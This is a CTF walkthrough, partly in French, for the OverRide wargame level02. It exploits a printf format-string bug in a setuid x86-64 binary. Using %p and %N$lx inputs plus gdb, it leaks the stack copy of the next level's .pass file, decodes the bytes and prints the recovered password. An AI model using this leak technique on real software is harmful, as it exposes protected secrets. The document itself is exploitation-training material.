# level02

By looking at the code and with `file` command, we can see that the program is for x64 architecture:

```bash
level02@OverRide:~$ file level02 
level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
```

The program read the `.pass` file of the next level. To debug it in gdb, we extract the program to another machine to debug it. We create a file in `home/users/level03`:

```bash
┌──(vagrant㉿kali)-[~]
└─$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" > /home/users/level03/.pass
```

The first `fgets` will be printed as the only one argument of `printf` if the password read in the `.pass` and the password passed as input don't match.

We try to print the stack, by passing modifiers as first input and empty string as second one:

```bash
--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p     
--[ Password: 
*****************************************
 0x7fff8c03a8d0 (nil) 0xffffffff 0x2a (nil) 0x7fff8c03aad8 0x100000000 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x8 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x41 0x2520702520702520 0x2070252070252070 0x7025207025207025 does not have access!
```

As we know what contains the `.pass` file, we can see that its content begins to pop at the 22th element until the 27th.



Si nous examinons la stack frame a partir de $rsp juste avant le printf nous pouvons voir que les adresses ne sont pas coherentes car printf va rajouter des bytes sur la stack frame en creant d autres stack frames dans ses fonctions, mais nous avons une idee de ce que nous pourrons recuperer avec les Direct Access Parameters de printf().

Vu que nous savons ce que contient le fake fichier .pass, nous pouvons observer son contenu sur la stack et dans les direct access parameters en format little indian, nous devons retenir les numeros des Direct Access Parameter.
Dans notre cas ce sont les numero 22, 23, 24, 25, 26, 27.

Nous pouvons avoir un apercu avec cette commande :
$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHIJL" > /tmp/.pass && gdb ./level02 -batch -ex "file level02" -ex "set exec-wrapper env -u LINES -u COLUMNS" -ex "set disassembly-flavor intel" -ex "b *main+4" -ex "b *main+148" -ex "b *main+237" -ex "b *main+453" -ex "b *main+523" -ex "b *main+654" -ex "r <<< '%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'" -ex "echo Debut de la memoire allouee:\n" -ex "x/wx \$rsp" -ex "ni" -ex "echo Fin de la memoire allouee:\n" -ex "x/wx $esp" -ex "c" -ex "echo Path du fichier de base:\n" -ex "x/s 0x400bb2" -ex 'set $rdi="/tmp/.pass"' -ex "echo Path du fichier modifier:\n" -ex 'x/s $rdi' -ex "c" -ex 'x/s $rdi' -ex "c" -ex 'x/s $rdi' -ex "c" -ex 'x/s $rdi' -ex "c" -ex "echo (gdb) x/152bx \$rsp\n" -ex "x/152bx $rsp" -ex "echo Printf Direct Access Parameters:\n" -ex "c"

Breakpoint 1 at 0x400818
Breakpoint 2 at 0x4008a8
Breakpoint 3 at 0x400901
Breakpoint 4 at 0x4009d9
Breakpoint 5 at 0x400a1f
Breakpoint 6 at 0x400aa2
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000000000400818 in main ()
Debut de la memoire allouee:
0x7fffffffe5e0: 0x00000000
0x000000000040081f in main ()
Fin de la memoire allouee:
0x7fffffffe5e4: 0x00000000

Breakpoint 2, 0x00000000004008a8 in main ()
Path du fichier de base:
0x400bb2:        "/home/users/level03/.pass"
Path du fichier modifier:
0x602010:        "/tmp/.pass"

Breakpoint 3, 0x0000000000400901 in main ()
0x7fffffffe540:  ""
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/

Breakpoint 4, 0x00000000004009d9 in main ()
0x7fffffffe570:  ""

Breakpoint 5, 0x0000000000400a1f in main ()
0x7fffffffe4d0:  ""
--[ Username: --[ Password: *****************************************

Breakpoint 6, 0x0000000000400aa2 in main ()
(gdb) x/152bx $rsp
0x7fffffffe4d1: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe4d9: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe4e1: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe4e9: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe4f1: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe4f9: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe501: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe509: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe511: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe519: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe521: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe529: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe531: 0x00    0x00    0x00    0x01    0x00    0x00    0x00    0x00
0x7fffffffe539: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x41
0x7fffffffe541: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe549: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe551: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7fffffffe559: 0x41    0x41    0x41    0x41    0x41    0x41    0x42    0x43
0x7fffffffe561: 0x44    0x45    0x46    0x47    0x48    0x49    0x4a    0x4c
Printf Direct Access Parameters:
0x7fffffffe4d0 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6c8 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4241414141414141 0x4a49484746454443 0x4c 0x7025207025207025 0x2520702520702520 0x2070252070252070 does not have access!
[Inferior 1 (process 24614) exited with code 01]

We can know try to pop up the content of the `.pass` file. We use `l` for print a long-sized integer as we are in x64 architecture, and `x` to print the result in hex:

```bash
--[ Username: %22$lx %23$lx %24$lx %25$lx %26$lx %27$lx
--[ Password: 
*****************************************
756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 0 does not have access!
```

Let's try to decode it. We first put it in file and reverse each 2 bytes:

```bash
level02@OverRide:~$ echo "756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394d" > /tmp/test 
level02@OverRide:~$ dd conv=swab if=/tmp/test of=/tmp/result 2>/dev/null
level02@OverRide:~$ cat /tmp/result 
57e60525437386845414a4531637931573a7173475e4768553a45386e67485378433760566b493d4
```

We need then to reverse bytes order each 16 bytes and print the result as ASCII values:

```bash
level02@OverRide:~$ cat /tmp/result | fold -w 16 | rev | tr -d '\n' | xxd -r -p
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
